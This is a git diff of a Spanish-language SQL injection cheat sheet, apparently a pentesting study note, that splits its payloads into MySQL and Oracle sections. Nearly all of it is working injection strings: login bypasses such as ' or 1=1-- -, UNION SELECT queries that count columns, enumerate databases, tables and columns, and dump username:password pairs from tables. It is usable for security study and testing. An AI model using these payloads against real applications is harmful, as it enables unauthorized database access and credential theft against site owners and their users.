@@ -45,6 +45,8 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 * Un indicio de inyección SQL es encontrar en la url **.php?id=** No es necesario que diga **id** también puede tener otro parámetro. 
 
 ```bash
+# MYSQL
+
 ❯ ' or '1'='1                                         # La mas sencilla y nos devolveria un true, dejamos una comilla sin cerrar ya que la propia query la cerrara
 ❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion, pero devuelve todo en la bvase de datos cuando no se utiliza en el panel de login
 ❯ <user>'-- -                                         # Este se usa en un panel de login 
@@ -56,12 +58,18 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 
 ## Para saber el numero de columnas.
 ```bash
+# MYSQL
+
 ❯ ' union select 1,2,3 -- -                           # Primero colocamos eso y buscamos cual es el numero que nos pone en el output de la web, ya que es en esa columna en donde podremos inyectar algo
 ❯ ' union select NULL,NULL,NULL -- -                  # Aveces solo acepta NULL en lugar de numeros
 ❯ ' union select "test",NULL,NULL -- -                # Podemos colocar texto 
 ❯ ' union select database(),NULL,user() -- -          # Queremos que muestre el nombre de la base de datos actual en uso, tambien podemos ver al usuario quien corre la base de datos
 
 ❯ ' union select NULL,@@version-- -                   # Mirar la version de MySQL y Microsoft
+```
+
+```bash 
+# ORACLE
 
 ❯ ' union select NULL,NULL from dual-- -              # Dual es una tabla existente en Oracle
 ❯ ' union select NULL,banner from v$version-- -       # Mirar la version en Oracle
@@ -69,34 +77,49 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 
 ### Para saber las bases de datos (DB) existentes.
 ```bash 
+# MYSQL
+
 ❯ ' union select schema_name from information_schema.schemata-- -                    # Nos muestra todas las bases de datos existentes  
 ❯ ' union select schema_name from information_schema.schemata limit 0,1-- -          # Nos muestra la primer base de datos existente, la cual podemos ir variando, limitando a 1 resultado, el que varia es el 0 a 1,2,3, etc...
 ❯ ' union select group_concat(schema_name) from information_schema.schemata-- -      # Nos muestra todas las bases de datos existentes, pero separadas por comas
-
 ```
 
 ### Para saber las tablas de la base de datos (DB) especifica.
 ```bash
-❯ ' union select table_name from information_schema.tables where table_schema='❮DB_Name❯'-- -                    # Nos muestra las tablas existentes
-❯ ' union select group_concat(table_name) from information_schema.tables where table_schema='❮DB_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
-❯ ' union select table_name from information_schema.tables limit 0,1-- -                                         # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
+# MYSQL
 
-❯ ' union select table_name from all_tables-- -                                                                  # Nos muestra las tablas en Oracle
-❯ ' union select owner from all_tables-- -                                                                       # Nos muestra las tablas en Oracle de los propietarios
+❯ ' union select table_name from information_schema.tables where table_schema='❮DB_Name❯'-- -  # Nos muestra las tablas existentes
+❯ ' union select group_concat(table_name) from information_schema.tables where table_schema='❮DB_Name❯'-- -  # Nos muestra las tablas existentes, pero separadas por comas
+❯ ' union select table_name from information_schema.tables limit 0,1-- -   # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
+```
+
+```bash 
+# ORACLE
+
+❯ ' union select table_name from all_tables-- -              # Nos muestra las tablas en Oracle
+❯ ' union select owner from all_tables-- -                   # Nos muestra las tablas en Oracle de los propietarios
 ❯ ' union select table_name from all_tables where owner='❮owner_Name❯'-- -
 ```
 
 ### Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica.
 ```bash 
+# MYSQL 
+
 ❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las tablas existentes
 ❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯' limit 0,1-- -          # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
 ❯ ' union select group_concat(column_name) from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
+```
 
-❯ ' union select column_name from all_tab_columns where table_name='❮Table_Name❯'                      # Mostrar las columnas en Oracle 
+```bash 
+# ORACLE
+
+❯ ' union select column_name from all_tab_columns where table_name='❮Table_Name❯'-- -   # Mostrar las columnas en Oracle 
 ```
 
 ### Para que nos muestre los datos de las columnas.
 ```bash
+# MYSQL 
+
 ❯ ' union select group_concat(username) from ❮DB_Name❯.❮Table_Name❯-- -          # Especificamos la DB y la tabla, esto si la DB no es la que esta en uso y solo asi podemos ver los datos que queremos
 ❯ ' union select group_concat(username) from ❮Table_Name❯-- -                    # Para que nos muestre los datos, aqui asumimos que la base de datos es la que esta en uso 
 ❯ ' union select group_concat(username,':',password) from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
@@ -112,6 +135,11 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' union select NULL,concat(username,':',password) from ❮Table_Name❯-- -         # Otra forma de agrupar los datos 
 ```
 
+```bash 
+# ORACLE
+
+❯ ' union select username||':'||password from ❮Table_Name❯-- -                   # Para que nos muestre los datos de los usuarios y su passwd separados por : 
+```
 
 ## Inyecciones Blind con respuesta condicional 
 
